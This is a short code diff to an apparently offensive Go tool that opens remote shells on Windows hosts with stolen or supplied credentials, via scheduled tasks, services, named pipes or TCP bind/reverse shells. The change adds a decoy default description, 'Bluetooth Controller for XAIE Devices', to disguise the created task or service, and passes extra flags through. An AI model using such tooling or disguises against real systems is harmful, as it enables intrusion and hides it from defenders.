@@ -39,6 +39,10 @@ func main() {
 	shell := args["shell"].(string)
 	nodelete := args["nodelete"].(bool)
 
+	if description == "" {
+		description = "Bluetooth Controller for XAIE Devices"
+	}
+
 	log.Printf("Target: %s, Method: %s\n", target, method)
 
 	/*	var smbsession *smb2.Session
@@ -75,16 +79,16 @@ func main() {
 		// Enter psuedo-interactive shell using Task Scheduler
 		// By default, Scheduled Task will run as SYSTEM if we have Local Admin permissions
 		// If you want to avoid this and run it as our admin account instead, pass -runas flag
-		handleTaskSession(target, batch, username, password, domain, name, description, runas)
+		handleTaskSession(target, batch, username, password, domain, name, description, runas, nodelete)
 	} else if method == "service" {
 		// Enter psuedo-interactive shell using Service Control Manager
-		handleServiceSession(target, batch, username, password, domain, name, description, runas)
+		handleServiceSession(target, batch, username, password, domain, name, description, runas, nodelete)
 	} else if method == "pipe" {
 		// Enter full-interactive shell using named pipes
-		handlePipeSession(target, username, password, domain, name, dropmethod, runas, nodelete)
+		handlePipeSession(target, username, password, domain, name, dropmethod, runas, nodelete, description)
 	} else if method == "tcp" {
 		// Enter full-interactive shell using TCP Client/Server - can be bind or reverse shell
-		handleTCP(target, username, password, domain, name, dropmethod, ip, shell, runas, reverse, port, nodelete)
+		handleTCP(target, username, password, domain, name, dropmethod, ip, shell, runas, reverse, port, nodelete, description)
 	}
 
 }
